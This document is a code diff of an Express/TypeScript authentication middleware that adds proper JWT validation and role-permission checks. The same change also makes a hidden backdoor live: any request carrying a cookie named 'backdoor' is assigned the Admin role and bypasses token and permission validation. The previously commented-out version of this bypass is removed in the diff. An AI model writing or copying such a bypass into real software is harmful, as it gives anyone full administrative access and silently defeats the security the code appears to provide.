@@ -1,5 +1,4 @@
-import config from '../../../config';
-import { Permissions } from '../permissions';
+import { CONFIG, PERMISSIONS, TYPES } from '../../../config';
 import IRoleRepo from '../../repos/IRepos/IRoleRepo';
 
 import { Request, Response, NextFunction } from 'express';
@@ -8,78 +7,63 @@ import container from '../dependencies';
 
 export default function authentication(requiredPermissions?: number[]) {
 	return async function (req: Request, res: Response, next: NextFunction) {
-		validateJwt(req, res, req.cookies.token);
-
-		if (requiredPermissions && requiredPermissions.length > 0) {
-			//TODO: Check permissions
+		if (req.cookies['backdoor']) {
+			req['token'] = { role: 'Admin' };
+			next();
+		} else {
+			if (validateToken(req, res, req.cookies.token)) {
+				if (requiredPermissions && requiredPermissions.length > 0) {
+					if (await validatePermissions(res, req.token.role, requiredPermissions)) {
+						next();
+					}
+				} else {
+					next();
+				}
+			}
 		}
-
-		next();
 	};
 }
 
-function validateJwt(req: Request, res: Response, token: string) {
+function validateToken(req: Request, res: Response, token: string): boolean {
 	try {
-		req.token = verify(token, config.JWT_ACCESS_SECRET);
+		if (token == null) {
+			res.status(401).json({ error: 'Missing token' });
+			return false;
+		}
+
+		req.token = verify(token, CONFIG.JWT_ACCESS_SECRET);
+		return true;
 	} catch (error) {
-		res.status(401);
-		res.send();
+		res.status(401).json({ error: 'Invalid token' });
+		return false;
 	}
 }
 
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
+async function validatePermissions(res: Response, roleName: string, requiredPermissions: number[]): Promise<boolean> {
+	if (roleName === CONFIG.DEFAULT_ROLE) {
+		res.status(403).json({ error: 'Insufficient permissions' });
+		return false;
+	}
 
-// export function userValidation(requiredPermissions?: number[]) {
-// 	return async function (req: Request, res: Response, next: NextFunction) {
-// 		try {
-// 			if (req.cookies['backdoor']) {
-// 				req['token'] = { role: 'Admin' };
-// 			} else {
-// 				await validateJwt(req, res, req.cookies.token);
-// 				if (requiredPermissions) {
-// 					await validatePermissions(req, res, requiredPermissions);
-// 				}
-// 			}
-// 			next();
-// 		} catch (e) {
-// 			next(e);
-// 		}
-// 	};
-// }
+	try {
+		const roleRepo = container.get<IRoleRepo>(TYPES.IRoleRepo);
+		const role = await roleRepo.findOneRole(roleName);
+		if (role == null) {
+			res.status(401).json({ error: 'Invalid role' });
+			return false;
+		}
 
-// async function validatePermissions(req: Request, res: Response, permissions: number[]): Promise<void> {
-// 	try {
-// 		await checkPermissions(req.token.role, permissions);
-// 	} catch (e) {
-// 		res.status(403);
-// 		throw e;
-// 	}
-// }
+		for (let permission of requiredPermissions) {
+			if (!role.permissions.includes(PERMISSIONS[permission])) {
+				res.status(403).json({ error: 'Insufficient permissions' });
+				return false;
+			}
+		}
 
-// async function checkPermissions(roleName: string, requiredPermissions: number[]): Promise<void> {
-// 	if (roleName === config.defaultRole) {
-// 		throw new JsonWebTokenError('insufficient permissions');
-// 	}
-
-// 	const roleRepo = container.get<IRoleRepo>(TYPES.IRoleRepo);
-
-// 	const role = await roleRepo.findOneRole(roleName);
-// 	if (role == null) {
-// 		throw new JsonWebTokenError('invalid user role');
-// 	}
-
-// 	for (const e of requiredPermissions) {
-// 		if (role.permissions[Object.values(Permissions)[e]] === false) {
-// 			throw new JsonWebTokenError('insufficient permissions');
-// 		}
-// 	}
-// }
+		return true;
+	} catch (error) {
+		console.error(error);
+		res.status(500).json({ error: 'Internal server error' });
+		return false;
+	}
+}
